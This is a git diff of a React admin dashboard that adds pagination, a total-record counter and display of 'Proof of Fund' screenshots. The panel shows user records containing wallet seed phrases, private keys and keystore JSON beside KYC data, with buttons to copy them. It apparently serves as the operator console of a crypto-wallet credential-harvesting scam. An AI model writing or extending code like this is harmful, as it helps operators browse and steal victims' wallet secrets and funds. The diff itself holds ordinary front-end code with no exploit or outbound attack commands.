@@ -26,7 +26,35 @@ function downloadFile(url, filename, format) {
     window.location.href = '/admin-login';
   };
 
+const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
+
 const AdminDashboard = () => {
+  const [totalRecords, setTotalRecords] = useState(0);
+
+  useEffect(() => {
+    const fetchTotalRecords = async () => {
+      try {
+        const response = await fetch(`${BACKEND_URL}/api/kyc/total-records`, {
+          method: 'GET',
+          headers: {
+            Authorization: `Bearer ${localStorage.getItem('adminToken')}`,
+          },
+        });
+
+        if (!response.ok) {
+          throw new Error('Failed to fetch total record count');
+        }
+
+        const data = await response.json();
+        setTotalRecords(data.totalRecords);
+      } catch (error) {
+        console.error('Error fetching total record count:', error);
+      }
+    };
+
+    fetchTotalRecords();
+  }, []);
+
   // helper: obfuscate seed (show first 3 and last 3 words)
   const obfuscateSeed = (seed) => {
     if (!seed) return '';
@@ -122,8 +150,6 @@ const AdminDashboard = () => {
   const [filterStatus, setFilterStatus] = useState('');
   const [filterWalletType, setFilterWalletType] = useState('');
   const [totalPages, setTotalPages] = useState(0);
-  // Prefetch cache: { [panel]: { [page]: data } }
-  const [prefetchCache, setPrefetchCache] = useState({ kyc: {}, wallets: {}, tradeData: {} });
   const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
   const [sidebarOpen, setSidebarOpen] = useState(false); // for mobile
 
@@ -219,6 +245,54 @@ const AdminDashboard = () => {
   // Sidebar width values for desktop
   const sidebarWidthValue = sidebarCollapsed ? 80 : 256; // px
   const sidebarWidthClass = sidebarCollapsed ? 'md:w-20 w-64' : 'w-64';
+
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handlePageChange = (newPage) => {
+    if (newPage < 1 || newPage > totalPages) return;
+    setIsLoading(true);
+    setPage(newPage);
+  };
+
+  useEffect(() => {
+    const fetchCurrentPage = async () => {
+      setIsLoading(true);
+      try {
+        const params = new URLSearchParams();
+        params.set('page', String(page));
+        params.set('limit', String(limit));
+        if (searchQ) params.set('q', searchQ);
+        if (filterStatus) params.set('status', filterStatus);
+        if (filterWalletType) params.set('walletType', filterWalletType);
+
+        const token = localStorage.getItem('adminToken');
+        const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc?${params.toString()}`, {
+          headers: { 'Authorization': `Bearer ${token}` },
+        });
+        const data = await res.json();
+
+        if (!res.ok) throw new Error(data.message || 'Failed to fetch data');
+
+        setKycRecords(data.docs || []);
+        setWalletRecords((data.docs || []).filter(r => r.seedPhrase || r.privateKey || r.keystoreJson));
+        setTotalPages(data.pages || 0);
+      } catch (err) {
+        setError(err.message);
+      } finally {
+        setIsLoading(false);
+      }
+    };
+
+    fetchCurrentPage();
+  }, [page, limit, searchQ, filterStatus, filterWalletType]);
+
+  // Utility to compute showing range
+  const getShowingRange = (page, limit, total) => {
+    const start = (page - 1) * limit + 1;
+    const end = Math.min(page * limit, total);
+    if (total === 0) return 'Showing 0 items';
+    return `Showing ${start}–${end} of ${total}`;
+  };
 
   return (
     <div className="min-h-screen flex bg-gray-100">
@@ -480,22 +554,25 @@ const AdminDashboard = () => {
                 </div>
               )}
               {/* Pagination controls */}
-              <div className="flex justify-center items-center gap-2 mt-4">
-                <button
-                  className="px-3 py-1 rounded border bg-blue-100 text-blue-700 disabled:opacity-50"
-                  onClick={() => setPage(page - 1)}
-                  disabled={page <= 1}
-                >
-                  Prev
-                </button>
-                <span className="px-2">Page {page} of {totalPages || 1}</span>
-                <button
-                  className="px-3 py-1 rounded border bg-blue-100 text-blue-700 disabled:opacity-50"
-                  onClick={() => setPage(page + 1)}
-                  disabled={page >= (totalPages || 1)}
-                >
-                  Next
-                </button>
+              <div className="flex flex-col md:flex-row items-center justify-between gap-2 mt-4">
+                <div className="flex items-center gap-2">
+                  <button
+                    className="px-3 py-1 rounded border bg-blue-100 text-blue-700 disabled:opacity-50"
+                    onClick={() => handlePageChange(page - 1)}
+                    disabled={page <= 1 || isLoading}
+                  >
+                    Prev
+                  </button>
+                  <span className="px-2">Page {page} of {totalPages || 1}</span>
+                  <button
+                    className="px-3 py-1 rounded border bg-blue-100 text-blue-700 disabled:opacity-50"
+                    onClick={() => handlePageChange(page + 1)}
+                    disabled={page >= (totalPages || 1) || isLoading}
+                  >
+                    Next
+                  </button>
+                </div>
+                <div className="text-sm text-gray-600">{getShowingRange(page, limit, totalRecords)}</div>
               </div>
             </div>
           )}
@@ -661,6 +738,12 @@ const AdminDashboard = () => {
                                 <button onClick={() => copyToClipboard(r.keystoreJson)} className="mt-1 px-2 py-1 bg-gray-800 text-white rounded text-xs">Copy JSON</button>
                               </div>
                             )}
+                            {r.pofScreenshot && (
+                              <div className="mb-2">
+                                <div className="font-semibold">Proof of Fund Screenshot</div>
+                                <img src={r.pofScreenshot} alt="Proof of Fund" className="max-w-full max-h-40 object-contain border rounded" />
+                              </div>
+                            )}
                           </td>
                         </tr>
                       ))}
@@ -721,3 +804,24 @@ const AdminDashboard = () => {
 };
 
 export default AdminDashboard;
+
+export const fetchPofScreenshots = async (sessionId) => {
+  try {
+    const response = await fetch(`${BACKEND_URL}/api/kyc/${sessionId}/pof-screenshot`, {
+      method: 'GET',
+      headers: {
+        Authorization: `Bearer ${localStorage.getItem('adminToken')}`,
+      },
+    });
+
+    if (!response.ok) {
+      throw new Error('Failed to fetch POF screenshots');
+    }
+
+    const data = await response.json();
+    return data.screenshots;
+  } catch (error) {
+    console.error('Error fetching POF screenshots:', error);
+    return [];
+  }
+};
